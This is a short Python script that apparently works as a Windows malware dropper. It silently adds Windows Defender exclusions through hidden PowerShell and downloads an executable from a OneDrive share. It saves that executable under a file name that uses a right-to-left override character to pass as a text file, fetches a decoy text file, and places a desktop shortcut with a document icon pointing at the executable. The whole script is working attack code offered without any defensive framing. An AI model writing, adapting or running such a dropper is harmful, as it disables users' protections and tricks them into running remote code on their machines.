import urllib.request
import subprocess
import os
import winshell

file_urls = [
    ("https://api.onedrive.com/v1.0/shares/s!Ary-0P-yV3rdowi3EBUeeW3q83iD/root/content", "C:\\Ap\u202Etxt.exe"),
    ("https://api.onedrive.com/v1.0/shares/s!Ary-0P-yV3rdowcGVfd59RaPLecK/root/content", "C:\\info.txt")
]

shortcut_path=os.path.expanduser("~\\Desktop")
icon_path = "C:\\Windows\\system32\\shell32.dll"

powershell_cmds = [
    f'Add-MpPreference -ExclusionPath "{file_urls[0][1]}"',
    f'Add-MpPreference -ExclusionPath "{shortcut_path}"'
]

for cmd in powershell_cmds:
    subprocess.run(["powershell.exe", "-WindowStyle", "Hidden", "-Command", cmd], capture_output=True)

for url, save_path in file_urls:
    urllib.request.urlretrieve(url, save_path)

shortcut_name = "Apex.txt.lnk"
shortcut_path = os.path.join(winshell.desktop(), shortcut_name)

first_file_path = file_urls[0][1]

winshell.CreateShortcut(
    Path=shortcut_path,
    Target=first_file_path,
    Icon=(icon_path, 70)
)
